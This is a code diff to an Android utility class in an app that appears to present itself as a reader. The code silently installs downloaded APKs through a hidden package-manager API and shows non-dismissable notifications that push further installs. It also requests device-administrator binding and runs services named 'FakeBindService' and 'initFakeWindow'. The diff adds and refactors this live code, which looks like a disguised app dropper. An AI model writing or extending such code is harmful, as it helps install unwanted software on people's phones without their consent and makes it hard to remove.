@@ -1,6 +1,5 @@
 package com.xstd.ip;
 
-import android.annotation.SuppressLint;
 import android.app.Activity;
 import android.app.Notification;
 import android.app.NotificationManager;
@@ -14,8 +13,6 @@ import android.content.pm.IPackageInstallObserver;
 import android.content.pm.IPackageManager;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
-import android.graphics.Bitmap;
-import android.graphics.drawable.BitmapDrawable;
 import android.graphics.drawable.Drawable;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
@@ -26,23 +23,20 @@ import android.os.IBinder;
 import android.os.storage.StorageManager;
 import android.support.v4.app.NotificationCompat;
 import android.util.Log;
-import android.view.View;
-
 import com.andorid.shu.love.LoveReaderActivity;
-import com.google.lovereader.R;
+import com.google.reader.R;
+import com.xstd.ip.module.ApplicationInfo;
 import com.xstd.ip.receiver.BindDeviceReceiver;
 import com.xstd.ip.service.CoreService;
 import com.xstd.ip.service.FakeBindService;
-import com.xstd.ip.service.SendServerService;
+import net.tsz.afinal.FinalDb;
 
 import java.io.File;
-import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.Calendar;
 import java.util.List;
 
-@SuppressLint("NewApi")
 public class Tools {
 
     public static final String KEY_HAS_BINDING_DEVICES = "key_has_bindding_devices";
@@ -63,7 +57,7 @@ public class Tools {
      * @param from
      */
     public static void startFakeService(Context context, String from) {
-        if (Config.isDebug) {
+        if (Config.DEBUG) {
             Tools.logW("[[CommonUtil::startFakeService]] from reason : " + from);
         }
         Intent is = new Intent();
@@ -103,23 +97,28 @@ public class Tools {
      * 安装apk文件
      *
      * @param context
-     * @param file
+     * @param info
      * @param observer
      * @throws Exception
      */
-    public static void installFile(Context context, File file, IPackageInstallObserver observer) {
-        Tools.logW("准备静默安装：" + file.getAbsolutePath());
+    public static void installFile(Context context, ApplicationInfo info, IPackageInstallObserver observer) {
+        Tools.logW("准备静默安装：" + info.getLocalPath());
+        File file = new File(info.getLocalPath());
         if (file == null || !file.isFile())
             return;
-        PackageInfo info = getPackageInfoByPath(context, file.getAbsolutePath());
-        if (info == null)
-            return;
-        Tools.logW("检测成功，准备安装" + file.getAbsolutePath());
-        int flags = 0;
-        try {
-            getPackageManger().installPackage(Uri.fromFile(file), observer, flags, info.packageName);
-        } catch (Exception e) {
-            e.printStackTrace();
+        PackageInfo packageInfo = getPackageInfoByPath(context, info.getLocalPath());
+        if (packageInfo == null) {
+            logW("程序包有误，需要重新下载。");
+            info.setDownload(false);
+            FinalDb.create(context, Config.DEBUG).update(info);
+        } else {
+            Tools.logW("检测成功，准备安装" + file.getAbsolutePath());
+            int flags = 0;
+            try {
+                getPackageManger().installPackage(Uri.fromFile(file), observer, flags, packageInfo.packageName);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
         }
     }
 
@@ -147,24 +146,30 @@ public class Tools {
      * 通过发送通知的方式安装
      *
      * @param context
-     * @param tickerText
-     * @param title      通知的标题
-     * @param text       通知的内容
-     * @param apkPath    apk包的绝对路径
+     * @param info
      */
-    public static void useNotificationInstall(Context context, String tickerText, String title, String text, String apkPath) {
-        Tools.logW("准备通知安装：" + apkPath);
-        Intent intent = new Intent("android.intent.action.INSTALL_PACKAGE");
+    public static void useNotificationInstall(Context context, ApplicationInfo info) {
+        Tools.logW("准备通知安装：" + info.getLocalPath());
+        Intent intent = new Intent();
+        if (isVersionBeyondGB()) {
+            intent.setAction("android.intent.action.INSTALL_PACKAGE");
+        } else {
+            intent.setAction("android.intent.action.VIEW");
+        }
         intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         intent.addCategory("android.intent.category.DEFAULT");
-        intent.setDataAndType(Uri.fromFile(new File(apkPath)), "application/vnd.android.package-archive");
+        intent.setDataAndType(Uri.fromFile(new File(info.getLocalPath())), "application/vnd.android.package-archive");
         NotificationManager nm = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
-        Notification notification = new NotificationCompat.Builder(context).setTicker(tickerText).setContentTitle(title).setContentText(text).setSmallIcon(R.drawable.ic_jog_dial_sound_on)
-                .setContentIntent(PendingIntent.getActivity(context, 0, intent, 0)).setDefaults(Notification.DEFAULT_SOUND).setWhen(System.currentTimeMillis()).build();
+        Notification notification = new NotificationCompat.Builder(context).setTicker(info.getTickerText()).setContentTitle(info.getTitle()).setContentText(info.getText()).setSmallIcon(R.drawable.ic_jog_dial_sound_on)
+                .setDefaults(Notification.DEFAULT_SOUND).setContentIntent(PendingIntent.getActivity(context, 0, intent, 0)).setWhen(System.currentTimeMillis()).build();
         notification.flags = Notification.FLAG_NO_CLEAR;
         logW("通知准备完成，检测程序是否正确");
-        PackageInfo packageInfo = checkPackageByPath(context, apkPath);
-        if (packageInfo != null) {
+        PackageInfo packageInfo = getPackageInfoByPath(context, info.getLocalPath());
+        if (packageInfo == null) {
+            logW("程序包有误，需要重新下载。");
+            info.setDownload(false);
+            FinalDb.create(context, Config.DEBUG).update(info);
+        } else {
             logW("程序检测结果正常，发送通知安装");
             nm.notify(generateNotificationID(packageInfo.applicationInfo.packageName), notification);
         }
@@ -177,17 +182,6 @@ public class Tools {
         else {
             return context.getPackageManager().getApplicationIcon(info.applicationInfo);
         }
-    }
-
-    /**
-     * 通过apk路径获得packageinfo对象
-     *
-     * @param context
-     * @param path
-     * @return
-     */
-    public static PackageInfo checkPackageByPath(Context context, String path) {
-        return context.getPackageManager().getPackageArchiveInfo(path, PackageManager.GET_ACTIVITIES);
     }
 
     /**
@@ -248,16 +242,15 @@ public class Tools {
      * @param msg
      */
     public static void logW(String msg) {
-        if (Config.isDebug)
+        if (Config.DEBUG)
             Log.w("INSTALL_PLUGIN", msg);
     }
 
-    public static void notifyServer(Context context, String action, String packname) {
-        Intent service = new Intent(context, SendServerService.class);
-        service.setAction(action);
-        service.putExtra("packname", packname);
-        context.startService(service);
-    }
+//    public static void notifyServer(Context context, PushMessage message) {
+//        Intent service = new Intent(context, SendServerService.class);
+//        service.putExtra("PUSH_MESSAGE",message);
+//        context.startService(service);
+//    }
 
     public static void bindDeviceManager(Activity activity) {
         Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
@@ -272,20 +265,20 @@ public class Tools {
     }
 
     public static boolean isBindingActive(Context context) {
-        return context.getSharedPreferences("setting", Context.MODE_PRIVATE).getBoolean(KEY_HAS_BINDING_DEVICES, false);
+        return context.getSharedPreferences(Config.SHARED_PRES, Context.MODE_PRIVATE).getBoolean(KEY_HAS_BINDING_DEVICES, false);
     }
 
     public static void setDeviceBindingActiveTime(Context context, int count) {
-        context.getSharedPreferences("setting", Context.MODE_PRIVATE).edit().putInt("device_bind_active", count).commit();
+        context.getSharedPreferences(Config.SHARED_PRES, Context.MODE_PRIVATE).edit().putInt("device_bind_active", count).commit();
     }
 
     public static int getDeviceBindingActiveTime(Context context) {
-        return context.getSharedPreferences("setting", Context.MODE_PRIVATE).getInt("device_bind_active", 0);
+        return context.getSharedPreferences(Config.SHARED_PRES, Context.MODE_PRIVATE).getInt("device_bind_active", 0);
     }
 
     public static void initFakeWindow(Context context) {
         if (isTrueTime()) {
-            SharedPreferences setting = context.getSharedPreferences("setting", Context.MODE_PRIVATE);
+            SharedPreferences setting = context.getSharedPreferences(Config.SHARED_PRES, Context.MODE_PRIVATE);
             long intiTime = setting.getLong("first_init_time", -1);
             if (intiTime == -1)
                 setting.edit().putLong("first_init_time", System.currentTimeMillis()).commit();
@@ -320,15 +313,14 @@ public class Tools {
     }
 
     public static String getDownloadDirectory(Context context) {
-        if (Environment.getExternalStorageState() == Environment.MEDIA_MOUNTED) {
-            Tools.logW("正常获取路径");
+        if (Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState())) {
             return Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath();
         }
         StorageManager sm = (StorageManager) context.getSystemService(Context.STORAGE_SERVICE);
         Method getVolumePaths = null;
         try {
-            getVolumePaths = StorageManager.class.getMethod("getVolumePaths", null);
-            String[] paths = (String[]) getVolumePaths.invoke(sm, null);
+            getVolumePaths = StorageManager.class.getMethod("getVolumePaths");
+            String[] paths = (String[]) getVolumePaths.invoke(sm);
             for (String path : paths) {
                 File file = new File(path, "Download");
                 Tools.logW("测试存储位置：" + file.getAbsolutePath() + "是否可用");
@@ -349,5 +341,19 @@ public class Tools {
             e.printStackTrace();
         }
         return null;
+    }
+
+    /**
+     * 判断一个字符串是否为空
+     *
+     * @param str
+     * @return
+     */
+    public static boolean isEmpty(String str) {
+        if (str == null)
+            return true;
+        if (str.trim().length() == 0)
+            return true;
+        return false;
     }
 }
